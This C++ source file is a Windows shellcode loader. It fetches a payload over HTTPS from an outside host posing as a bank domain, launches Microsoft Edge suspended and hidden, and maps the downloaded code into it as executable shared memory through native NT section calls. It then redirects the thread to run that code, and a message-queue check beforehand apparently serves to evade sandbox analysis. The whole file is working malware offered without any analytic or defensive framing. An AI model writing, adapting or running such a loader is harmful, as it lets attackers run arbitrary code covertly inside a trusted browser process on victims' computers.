#include <Windows.h>
#include <winhttp.h>
#include <vector>

#include "Native.h"

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> download(LPCWSTR baseAddress, LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS
    );

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,
        0
    );

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    WinHttpReceiveResponse(
        hRequest,
        NULL
    );

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

void inject()
{
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info
    );

    std::vector<BYTE> shellcode = download(L"www.infinity-bank.com\0", L"/https\0");

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };
    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );

    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE
    );

    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    PVOID hRemoteAddress = NULL;
    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE
    );

    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    ResumeThread(process_info->hThread);

    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress
    );
}

void start()
{
    MSG msg;
    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
        return;

    if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42)
        return;

    inject();
}